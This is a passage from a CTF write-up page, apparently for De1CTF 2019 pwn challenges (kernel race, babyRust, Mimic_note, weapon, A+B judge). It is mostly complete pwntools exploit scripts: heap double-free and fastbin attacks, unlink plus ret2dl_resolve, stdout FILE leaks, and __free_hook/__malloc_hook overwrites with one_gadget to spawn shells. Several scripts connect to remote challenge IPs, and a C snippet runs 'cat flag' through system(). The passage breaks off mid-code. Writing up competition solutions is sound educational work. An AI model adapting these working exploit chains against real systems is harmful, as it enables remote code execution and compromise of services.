object</span></h4><p>通过第一步获得slab地址，从而推出physmap的起始地址（这两个区域很接近，或者应该说physmap包含了slab，这点不确定，没深入源码）</p><p>为了扩大竞争条件的窗口期，我是通过将猜测的physmap地址直接写入文件（不经过缓冲区，直接写入文件，<a href="https://www.cnblogs.com/muahao/p/7903230.html" target="_blank" rel="noopener">O_DIRECT</a>），然后再mmap映射文件去读。后面流程和竞争读一样，copy_from_user的时候，将buffer删掉，这样就可以改写下一块空闲slab地址，然后接着open("/dev/ptmx",O_RDWR);就可以申请tty_struct到可控physmap地址上。</p><h4><span id="四-查找physmap地址别名">四、查找physmap地址别名</span></h4><p>查找mmap出来的地址，如果不为NULL就代表找到了第三步申请的tty_struct结构体。这样就可以在用户态修改内核分配的tty_struct。</p><h4><span id="五-tty_struct常规用法">五、tty_struct常规用法</span></h4><p>open("/dev/ptmx",O_RDWR);实际上会分配两个tty_struct，主从模式。实际上用户态可控的tty_struct是<a href="https://blog.csdn.net/luckywang1103/article/details/71191821" target="_blank" rel="noopener">pts</a>的（因为第一个tty_struct会分配到删除了的buffer地址，第二个tty_struct才会分配到physmap上），所以还要open(pts_name, O_RDONLY | O_NOCTTY);然后才是常规的ioctl操作。</p><p>这里懒得找gadgets，就直接调用set_memory_x设置可执行，后面再跳到shellcode在内核态下执行就好了。</p><p>PS:向经典的ret2dir致敬。本来只是打算uaf加ret2dir的，后面写着写着就成伪竞态了。 :)</p><h4><span id="exp">exp</span></h4><p><a href="https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/pwn/Race/exp.c" target="_blank" rel="noopener">exp.c</a></p><h4><span id="reference">reference</span></h4><p>copy_to_user : https://elixir.bootlin.com/linux/v5.0-rc8/source/include/linux/uaccess.h#L149</p><p>ret2dir : https://www.cnblogs.com/0xJDchen/p/6143102.html</p><p>O_DIRECT : https://www.cnblogs.com/muahao/p/7903230.html</p><h2><span id="babyrust">babyRust</span></h2><p>babyRust 源码：https://github.com/zjw88282740/babyRust</p><p>出题思路来源<a href="https://www.cvedetails.com/cve/CVE-2019-12083/" title="CVE-2019-12083 security vulnerability details" target="_blank" rel="noopener">CVE-2019-12083</a></p><p>逆向有点恶心 任意读十分简单，通过读got表得到libc基址，观察可发现存在double free的情况，直接写__free_hook <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">libc=ELF(&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;)</span><br><span class="line">#p=process(&quot;./babyRust&quot;)</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line">p=remote(&quot;207.148.126.75&quot;,60001)</span><br><span class="line">def show():</span><br><span class="line">    p.recvuntil(&quot;4.exit\n&quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line"></span><br><span class="line">def edit(name,x,y,z,i):</span><br><span class="line">    p.recvuntil(&quot;4.exit\n&quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;input your name:&quot;)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(x))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(y))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(z))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;4.exit\n&quot;)</span><br><span class="line">p.sendline(&quot;1312&quot;) #Boom-&gt;S</span><br><span class="line">show()</span><br><span class="line">heap_addr=int(p.recvuntil(&quot;, &quot;,drop=True)[2:])-0xa40</span><br><span class="line">print hex(heap_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(&quot;1313&quot;)</span><br><span class="line">p.sendline(&quot;1314&quot;)</span><br><span class="line"></span><br><span class="line">edit(&quot;aaa&quot;,heap_addr+0x2ce0,0,0,0)</span><br><span class="line">show()</span><br><span class="line">p.sendline(&quot;1312&quot;)</span><br><span class="line">#show()</span><br><span class="line">print p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(&quot;1313&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(&quot;bbb &quot;,heap_addr+0xb18,8,8,heap_addr+0xb18)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&quot;3,3,&quot;)</span><br><span class="line">pie_addr=u64(p.recv(8))-239480</span><br><span class="line"></span><br><span class="line">print hex(pie_addr)</span><br><span class="line"></span><br><span class="line">edit(&quot;bbb &quot;,pie_addr+0x3be78,8,8,0)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&quot;3,3,&quot;)</span><br><span class="line"></span><br><span class="line">libc_addr=u64(p.recv(8))-1161904</span><br><span class="line">print hex(libc_addr)</span><br><span class="line">edit(&quot;bbbbb&quot;,heap_addr+0x2d40,2,3,4)</span><br><span class="line">p.sendline(&quot;1314&quot;)</span><br><span class="line">p.recvuntil(&quot;4.exit\n&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;input your name:&quot;)</span><br><span class="line">p.sendline(&quot;z&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.sendline(str(0))</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.sendline(str(4015))</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.sendline(str(5))</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.sendline(str(0))</span><br><span class="line">show()</span><br><span class="line">free_hook=libc_addr+libc.symbols[&apos;__free_hook&apos;]-0x28-8</span><br><span class="line">p.sendline(&quot;1312&quot;)</span><br><span class="line">edit(&quot;\x00&quot;*0x20,free_hook,0,0,0)</span><br><span class="line">one_gadget=libc_addr+0x4f322</span><br><span class="line">p.sendline(&quot;1313&quot;)</span><br><span class="line">edit(&quot;\x00&quot;*0x30,free_hook,2,3,one_gadget)</span><br><span class="line">p.sendline(&quot;1314&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h2><span id="mimic_note">Mimic_note</span></h2><p>题目给了两个二进制文件，一个是32位的，一个是64位的</p><p>主要思想是，给定相同的输入，判断32位和64位程序的输入是否相同，假如不相同就直接退出</p><p>题目是一个比较简单的堆题</p><p>我们首先来看下main函数</p><p>可以看到有4个功能</p><ol type="1"><li>new</li><li>delete</li><li>show</li><li>edit</li></ol><p>其中edit存在一个off by null的漏洞，利用这个漏洞可以unlink，获取任意写</p><p>在任意写之后，可以利用一个gadget，将栈转移到bss段上面，进行ROP，这个时候利用ret2dl_resolve就可以打开flag，写到某个note那里，那个note提前设好一个值，假如不相当的话，就会输出what are you trying to do?</p><p>下面是exp</p><p>这个是预期解，不过因为mimic写得不是很好，有挺多非预期的........</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import roputils </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def brute_flag(idx,v):</span><br><span class="line">    debug=1</span><br><span class="line"></span><br><span class="line">    #context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">    rop=roputils.ROP(&apos;./mimic_note_32&apos;)</span><br><span class="line"></span><br><span class="line">    if debug:</span><br><span class="line">        p=process(&apos;./mimic&apos;)</span><br><span class="line">        #p=process(&apos;./mimic_note_32&apos;)</span><br><span class="line">        #p=process(&apos;./mimic_note_64&apos;)</span><br><span class="line">        #gdb.attach(p)</span><br><span class="line">    else:</span><br><span class="line">        #p=remote(&apos;127.0.0.1&apos;,9999)</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    def ru(x):</span><br><span class="line">        return p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">    def se(x):</span><br><span class="line">        p.send(x)</span><br><span class="line"></span><br><span class="line">    def sl(x):</span><br><span class="line">        p.sendline(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def new(sz):</span><br><span class="line">        sl(&apos;1&apos;)</span><br><span class="line">        ru(&apos;size?&apos;)</span><br><span class="line">        sl(str(sz))</span><br><span class="line">        ru(&quot;&gt;&gt; &quot;)</span><br><span class="line"></span><br><span class="line">    def delete(idx):</span><br><span class="line">        sl(&apos;2&apos;)</span><br><span class="line">        ru(&apos;index ?&apos;)</span><br><span class="line">        sl(str(idx))</span><br><span class="line">        ru(&quot;&gt;&gt; &quot;)</span><br><span class="line"></span><br><span class="line">    def show(idx):</span><br><span class="line">        sl(&apos;3&apos;)</span><br><span class="line">        ru(&apos;index ?&apos;)</span><br><span class="line">        sl(str(idx))</span><br><span class="line"></span><br><span class="line">    def edit(idx,content):</span><br><span class="line">        sl(&apos;4&apos;)</span><br><span class="line">        ru(&apos;index ?&apos;)</span><br><span class="line">        sl(str(idx))</span><br><span class="line">        ru(&apos;content?\n&apos;)</span><br><span class="line">        se(content)</span><br><span class="line">        ru(&quot;&gt;&gt; &quot;)</span><br><span class="line"></span><br><span class="line">    #unlink attack x86</span><br><span class="line"></span><br><span class="line">    new(0x68)</span><br><span class="line">    new(0x68)</span><br><span class="line">    new(0x94)</span><br><span class="line">    new(0xf8)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fake_chunk = p32(0)+p32(0x91)+p32(0x804a070-0xc)+p32(0x804a070-0x8)</span><br><span class="line">    fake_chunk = fake_chunk.ljust(0x90,&apos;\0&apos;)</span><br><span class="line"></span><br><span class="line">    edit(2,fake_chunk+p32(0x90))</span><br><span class="line"></span><br><span class="line">    delete(3)</span><br><span class="line"></span><br><span class="line">    #ret2dlresolve and blind injection</span><br><span class="line"></span><br><span class="line">    new(0x200)</span><br><span class="line"></span><br><span class="line">    bss = 0x0804a500</span><br><span class="line"></span><br><span class="line">    edit(2,p32(0x100)+p32(0x804A014)+p32(0x98)+p32(bss+0x300)+p32(0x94)+p32(bss)+p32(0x200))</span><br><span class="line">    edit(1,p32(0x80489FA))</span><br><span class="line"></span><br><span class="line">    payload = p32(bss-0x100)+rop.dl_resolve_call(bss+0x60, bss+0x180,0)</span><br><span class="line">    payload += p32(0x8048460)+p32(0x80489F9)+p32(3)+p32(bss+0x300-idx)+p32(idx+1)</span><br><span class="line">    payload += p32(0x080489FB)+p32(bss-0x100)</span><br><span class="line">    payload += p32(0x804893C)</span><br><span class="line"></span><br><span class="line">    payload = payload.ljust(0x60,&apos;\x00&apos;)</span><br><span class="line">    payload += rop.dl_resolve_data(bss+0x60, &apos;open&apos;)</span><br><span class="line">    payload = payload.ljust(0x180,&apos;\x00&apos;)</span><br><span class="line">    payload += &apos;flag&apos;</span><br><span class="line"></span><br><span class="line">    edit(3,payload)</span><br><span class="line"></span><br><span class="line">    edit(2,v+&apos;\0&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sl(&apos;2\x00&apos;+&apos;a&apos;*6+p32(0x80488DE))</span><br><span class="line">    ru(&apos;index ?\n&apos;)</span><br><span class="line">    sl(&apos;3\x00&apos;)</span><br><span class="line">    ru(&apos;&gt;&gt; &apos;)</span><br><span class="line"></span><br><span class="line">    show(2)</span><br><span class="line"></span><br><span class="line">    ru(&apos;\n&apos;)</span><br><span class="line">    data = ru(&apos;\n&apos;) </span><br><span class="line"></span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line">    if len(data)&gt;5:</span><br><span class="line">        return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">charset =&apos;&#123;&#125;_&apos;+ string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"></span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(40):</span><br><span class="line">    for q in charset:</span><br><span class="line">        if brute_flag(i,q):</span><br><span class="line">            flag+=q</span><br><span class="line">            print(flag)</span><br><span class="line">            if q == &apos;&#125;&apos;:</span><br><span class="line">                exit(0)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><h2><span id="weapon">weapon</span></h2><p><a href="./docker-enviroment">docker-enviroment</a></p><p>this problem have two ways to solve it</p><blockquote><p>the key to topic is to let a chunk have libc address in fd. and then we use a trick to leak a libc address ,finally use fastbin attack to get shell.</p></blockquote><h4><span id="first">first</span></h4><p>make a fake 0x80(more than that is ok) chunk and free it .so that we can get libc in fd and then edit the struct of stdout to leak.finally get shell.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">def cmd(c):</span><br><span class="line">p.sendlineafter(&quot;&gt;&gt; \n&quot;,str(c))</span><br><span class="line">def Cmd(c):</span><br><span class="line">p.sendlineafter(&quot;&gt;&gt; &quot;,str(c))</span><br><span class="line">def add(size,idx,name=&quot;padding&quot;):</span><br><span class="line">cmd(1)</span><br><span class="line">p.sendlineafter(&quot;: &quot;,str(size))</span><br><span class="line">p.sendlineafter(&quot;: &quot;,str(idx))</span><br><span class="line">p.sendafter(&quot;:\n&quot;,name)</span><br><span class="line">def free(idx):</span><br><span class="line">cmd(2)</span><br><span class="line">p.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">def edit(idx,name):</span><br><span class="line">cmd(3)</span><br><span class="line">p.sendlineafter(&quot;: &quot;,str(idx))</span><br><span class="line">p.sendafter(&quot;:\n&quot;,name)</span><br><span class="line">def Add(size,idx,name=&quot;padding&quot;):</span><br><span class="line">Cmd(1)</span><br><span class="line">p.sendlineafter(&quot;: &quot;,str(size))</span><br><span class="line">p.sendlineafter(&quot;: &quot;,str(idx))</span><br><span class="line">p.sendafter(&quot;:&quot;,name)</span><br><span class="line">def Free(idx):</span><br><span class="line">Cmd(2)</span><br><span class="line">p.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line"></span><br><span class="line">#p=process(&apos;./pwn&apos;)</span><br><span class="line">p=remote(&quot;139.180.216.34&quot;,8888)</span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line">add(0x18,0)</span><br><span class="line">add(0x18,1)</span><br><span class="line">add(0x60,2,p64(0x0)+p64(0x21)+&apos;\x00&apos;*0x18+p64(0x21)*5)</span><br><span class="line">add(0x60,3,p64(0x21)*12)</span><br><span class="line">add(0x60,4)</span><br><span class="line">add(0x60,5)</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x18,0,&quot;\x50&quot;)</span><br><span class="line">add(0x18,0,&apos;\x00&apos;*8)</span><br><span class="line">add(0x18,0,&quot;A&quot;)</span><br><span class="line"></span><br><span class="line">add(0x18,0,&apos;GET&apos;)</span><br><span class="line"></span><br><span class="line">edit(2,p64(0x0)+p64(0x91))</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">add(0x18,0)</span><br><span class="line">add(0x60,0,&apos;\xdd\x25&apos;)</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">free(5)</span><br><span class="line">free(2)</span><br><span class="line">free(5)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p,&apos;&apos;)</span><br><span class="line">add(0x60,4,&apos;\x70&apos;)</span><br><span class="line">#</span><br><span class="line">add(0x60,0)</span><br><span class="line">add(0x60,0)</span><br><span class="line">add(0x60,0)</span><br><span class="line">add(0x60,0,&apos;\x00&apos;*(0x40+3-0x10)+p64(0x1800)+&apos;\x00&apos;*0x19)</span><br><span class="line">p.read(0x40)</span><br><span class="line"></span><br><span class="line">base=u64(p.read(6).ljust(8,&apos;\x00&apos;))-(0x7ffff7dd2600-0x7ffff7a0d000)</span><br><span class="line">log.warning(hex(base))</span><br><span class="line">#raw_input()</span><br><span class="line">libc=ELF(&quot;./pwn&quot;).libc</span><br><span class="line">Add(0x60,0)</span><br><span class="line">Add(0x60,1)</span><br><span class="line">Add(0x18,2)</span><br><span class="line">Free(0)</span><br><span class="line">Free(1)</span><br><span class="line">Free(0)</span><br><span class="line">Add(0x60,0,p64(libc.sym[&apos;__malloc_hook&apos;]+base-35))</span><br><span class="line">Add(0x60,0)</span><br><span class="line">Add(0x60,0)</span><br><span class="line">one=0xf02a4</span><br><span class="line">Add(0x60,0,&apos;\x00&apos;*19+p64(one+base))</span><br><span class="line"></span><br><span class="line">Free(1)</span><br><span class="line">Free(1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4><span id="second">second</span></h4><p>when we use scanf to input something .if you input lots of things ,it will malloc a 0x400 chunk to keep it temporarily。if we keep some fastbin when it malloc.it will be put into smallbin.now we also have libc address.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">#p = process(&quot;./weapon&quot;)</span><br><span class="line">p = remote(&quot;139.180.216.34&quot;,8888)</span><br><span class="line">elf = ELF(&quot;./weapon&quot;)</span><br><span class="line">a = elf.libc</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">def create(idx,size,content):</span><br><span class="line">p.recvuntil(&quot;&gt;&gt; \n&quot;)</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.recvuntil(&quot;weapon: &quot;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&quot;index: &quot;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(&quot;name:&quot;)</span><br><span class="line">p.send(content)</span><br><span class="line">def delete(idx):</span><br><span class="line">p.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">p.sendline(str(2))</span><br><span class="line">p.recvuntil(&quot;idx :&quot;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">p.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">p.sendline(str(3))</span><br><span class="line">p.recvuntil(&quot;idx: &quot;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(&quot;content:\n&quot;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">create(0,0x60,&quot;a&quot;)</span><br><span class="line">create(1,0x60,&quot;b&quot;)</span><br><span class="line">create(2,0x60,&quot;c&quot;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line">p.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;*0x1000)</span><br><span class="line">create(3,0x60,&quot;\xdd\x25&quot;)</span><br><span class="line">create(4,0x60,&quot;e&quot;)</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line">edit(1,&quot;\x00&quot;)</span><br><span class="line">create(5,0x60,&quot;f&quot;)</span><br><span class="line">create(6,0x60,&quot;f&quot;)</span><br><span class="line">file_struct = p64(0xfbad1887)+p64(0)*3+&quot;\x58&quot;</span><br><span class="line">create(7,0x60,&quot;\x00&quot;*0x33+file_struct)</span><br><span class="line">libc_addr =  u64(p.recvuntil(&quot;\x00&quot;,drop=True)[1:].ljust(8,&quot;\x00&quot;))-a.symbols[&quot;_IO_2_1_stdout_&quot;]-131</span><br><span class="line">print hex(libc_addr)</span><br><span class="line">delete(6)</span><br><span class="line">edit(6,p64(libc_addr+a.symbols[&quot;__malloc_hook&quot;]-0x23))</span><br><span class="line"></span><br><span class="line">create(8,0x60,&quot;t&quot;)</span><br><span class="line"></span><br><span class="line">create(9,0x60,&quot;a&quot;*0x13+p64(libc_addr+0xf1147))</span><br><span class="line">p.recvuntil(&quot;&gt;&gt; \n&quot;)</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.recvuntil(&quot;weapon: &quot;)</span><br><span class="line">p.sendline(str(0x60))</span><br><span class="line">p.recvuntil(&quot;index: &quot;)</span><br><span class="line">p.sendline(str(6))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="ab-judge">A+B judge</span></h2><p>先跟各位师傅说声对不起......其实这道题没出好，本意是想出道代码审计的题目的，结果原来的库的bug比预期的多......</p><p>下面是一个非预期解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    system(&quot;cat flag&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是一个预期解，基本思想是利用32位的syscall去绕过限制，去读取文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#include 